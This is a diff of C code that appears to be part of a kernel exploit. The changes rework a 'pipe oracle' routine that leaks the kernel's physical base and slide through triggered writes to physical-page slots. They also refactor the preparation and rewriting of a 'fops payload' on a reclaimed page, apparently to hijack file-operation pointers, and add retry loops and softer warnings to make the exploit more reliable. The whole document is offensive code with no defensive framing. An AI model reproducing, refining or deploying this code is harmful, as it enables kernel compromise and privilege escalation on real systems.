@@ -2481,8 +2481,8 @@ static int slide_trigger_physical_slot(size_t slot) {
     }
   }
 
-  pr_error("p0 physical slot=%zu write window failed after %d attempt(s)\n",
-           slot, attempts);
+  pr_warning("p0 physical slot=%zu write window failed after %d attempt(s)\n",
+             slot, attempts);
   return 0;
 }
 
@@ -2508,11 +2508,25 @@ static int slide_trigger_physical_slot_reliable(size_t slot) {
 #endif
 }
 
-static int slide_restore_physical_oracle(void) {
-  int gate_restored =
+static int slide_restore_physical_gate_oracle(void) {
+  int restored =
       slide_trigger_physical_slot_reliable(P0_ORACLE_GATE_RESTORE_SLOT);
-  int probe_restored =
+  pr_info("p0 physical gate restore trigger=%d gate_page=%016zx\n",
+          restored, p0_gate_page_struct);
+  return restored;
+}
+
+static int slide_restore_physical_probe_oracle(void) {
+  int restored =
       slide_trigger_physical_slot_reliable(P0_ORACLE_PROBE_RESTORE_SLOT);
+  pr_info("p0 physical probe restore trigger=%d probe_page=%016zx\n",
+          restored, p0_probe_page_struct);
+  return restored;
+}
+
+static int slide_restore_physical_oracle(void) {
+  int gate_restored = slide_restore_physical_gate_oracle();
+  int probe_restored = slide_restore_physical_probe_oracle();
   pr_info("p0 physical restore triggers gate=%d probe=%d "
           "gate_page=%016zx probe_page=%016zx\n",
           gate_restored, probe_restored,
@@ -2750,20 +2764,15 @@ static int slide_leak_physical_base(void) {
 #endif
       continue;
     }
-    if (!slide_trigger_physical_slot_reliable(P0_ORACLE_GATE_SLOT)) {
-      pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
-               fresh_attempt, fresh_page_attempts);
-      fresh_attempt++;
-      refresh_oracle = 1;
-      continue;
-    }
+    int gate_triggered =
+        slide_trigger_physical_slot_reliable(P0_ORACLE_GATE_SLOT);
     int gate_result = verify_p0_pipe_oracle_gate();
-    pr_info("p0 fresh page result=%d attempt=%d/%d\n",
-            gate_result, fresh_attempt, fresh_page_attempts);
+    pr_info("p0 fresh page triggered=%d result=%d attempt=%d/%d\n",
+            gate_triggered, gate_result, fresh_attempt, fresh_page_attempts);
     if (getenv("P0_ORACLE_GATE_DIAG")) {
       pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
       if (gate_result != 0) {
-        slide_restore_physical_oracle();
+        slide_restore_physical_gate_oracle();
       }
       return 0;
     }
@@ -2776,25 +2785,52 @@ static int slide_leak_physical_base(void) {
     }
     app_publish_p0_dirty();
     if (gate_result < 0) {
-      pr_error("p0 physical pipe gate changed unexpected pages\n");
-      slide_restore_physical_oracle();
+      pr_warning("p0 physical pipe gate changed unexpected pages\n");
+      slide_restore_physical_gate_oracle();
       return 0;
     }
-    if (!slide_trigger_physical_slot_reliable(P0_ORACLE_PROBE_SLOT)) {
-      slide_restore_physical_oracle();
-      return 0;
+    uintptr_t offset = (uintptr_t)-1;
+#ifdef APP_P0_PROBE_ATTEMPTS
+    const int probe_attempts = APP_P0_PROBE_ATTEMPTS;
+#else
+    const int probe_attempts = 1;
+#endif
+    for (int probe_attempt = 1; probe_attempt <= probe_attempts;
+         probe_attempt++) {
+      size_t probe_slot = P0_ORACLE_PROBE_SLOT +
+          (size_t)(probe_attempt - 1) % P0_ORACLE_PROBE_SLOT_COUNT;
+      int probe_triggered =
+          slide_trigger_physical_slot_reliable(probe_slot);
+      uintptr_t candidate = scan_p0_pipe_oracle();
+      pr_info("p0 probe attempt=%d/%d slot=%zu triggered=%d changed=%d "
+              "candidate=%08zx\n",
+              probe_attempt, probe_attempts, probe_slot, probe_triggered,
+              p0_pipe_scan_changed_pages, candidate);
+      if (candidate != (uintptr_t)-1) {
+        offset = candidate;
+        break;
+      }
+      /* A non-destructive snapshot proving that every pipe still contains
+       * its marker means the write missed and another attempt is safe.  Any
+       * changed or uncertain page ends probing immediately. */
+      if (p0_pipe_scan_changed_pages != 0) {
+        break;
+      }
     }
-    uintptr_t offset = scan_p0_pipe_oracle();
     if (offset == (uintptr_t)-1) {
-      slide_restore_physical_oracle();
+      int gate_restored = slide_restore_physical_gate_oracle();
+      int probe_restored = p0_pipe_scan_changed_pages == 0
+          ? 1 : slide_restore_physical_probe_oracle();
+      pr_info("p0 failed probe restore gate=%d probe=%d changed=%d\n",
+              gate_restored, probe_restored, p0_pipe_scan_changed_pages);
       return 0;
     }
 #if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
     APP_P0_FINGERPRINT_INVERSE_SLIDE
     if (offset > P0_ORACLE_PROBE_OFFSET) {
-      pr_error("p0 fingerprint source offset exceeds probe source=%08zx "
-               "probe=%08llx\n",
-               offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET);
+      pr_warning("p0 fingerprint source offset exceeds probe source=%08zx "
+                 "probe=%08llx\n",
+                 offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET);
       slide_restore_physical_oracle();
       return 0;
     }
@@ -2811,32 +2847,36 @@ static int slide_leak_physical_base(void) {
 #if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
     APP_FOPS_REWRITE_RECLAIMED_PAGE
     app_fops_reused_page_ready = 0;
-    int reuse_prepared = prepare_reused_fops_payload(offset);
-    int reuse_redirected = 0;
-    int reuse_page_restored = 1;
-    int reuse_verified = 0;
-    if (reuse_prepared) {
-      reuse_redirected =
-          slide_trigger_physical_slot_reliable(P0_ORACLE_PRODUCTION_SLOT);
-      /* Restore slot 4's struct-page parent while the original slide bank is
-       * still present.  The verified rewrite below replaces that bank. */
-      reuse_page_restored = slide_trigger_physical_slot_reliable(
-          P0_ORACLE_GATE_RESTORE_SLOT);
-      if (!reuse_page_restored) {
-        pr_error("p0 fops page reuse metadata restore failed\n");
-        return 0;
+    if (app_fops_page_reuse_enabled()) {
+      int reuse_prepared = prepare_reused_fops_payload(offset);
+      int reuse_redirected = 0;
+      int reuse_page_restored = 1;
+      int reuse_verified = 0;
+      if (reuse_prepared) {
+        reuse_redirected =
+            slide_trigger_physical_slot_reliable(P0_ORACLE_PRODUCTION_SLOT);
+        /* Restore slot 4's struct-page parent while the original slide bank
+         * is still present.  The verified rewrite replaces that bank. */
+        reuse_page_restored = slide_trigger_physical_slot_reliable(
+            P0_ORACLE_GATE_RESTORE_SLOT);
+        if (!reuse_page_restored) {
+          pr_warning("p0 fops page reuse metadata restore failed\n");
+          return 0;
+        }
+        reuse_verified = reuse_redirected && rewrite_reused_fops_payload();
       }
-      reuse_verified = reuse_redirected && rewrite_reused_fops_payload();
+      app_fops_reused_page_ready = reuse_verified;
+      if (reuse_verified && !prepare_reused_fops_payload(offset)) {
+        pr_warning("p0 fops page reuse route refresh failed; using fresh page\n");
+        app_fops_reused_page_ready = 0;
+      }
+      pr_info("p0 fops page reuse prepared=%d redirected=%d restored=%d "
+              "verified=%d page=%016zx slide=%08zx\n",
+              reuse_prepared, reuse_redirected, reuse_page_restored,
+              app_fops_reused_page_ready, page_base, offset);
+    } else {
+      pr_info("p0 fops page reuse disabled; using fresh verified page\n");
     }
-    app_fops_reused_page_ready = reuse_verified;
-    if (reuse_verified && !prepare_reused_fops_payload(offset)) {
-      pr_warning("p0 fops page reuse route refresh failed; using fresh page\n");
-      app_fops_reused_page_ready = 0;
-    }
-    pr_info("p0 fops page reuse prepared=%d redirected=%d restored=%d "
-            "verified=%d page=%016zx slide=%08zx\n",
-            reuse_prepared, reuse_redirected, reuse_page_restored,
-            app_fops_reused_page_ready, page_base, offset);
 #endif
     slide_p0_session_fresh = 1;
     size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
@@ -2868,7 +2908,7 @@ static int slide_leak_physical_base(void) {
   }
   app_publish_p0_dirty();
   if (gate_result < 0) {
-    pr_error("p0 physical pipe gate changed unexpected pages\n");
+    pr_warning("p0 physical pipe gate changed unexpected pages\n");
     slide_restore_physical_oracle();
     return 0;
   }
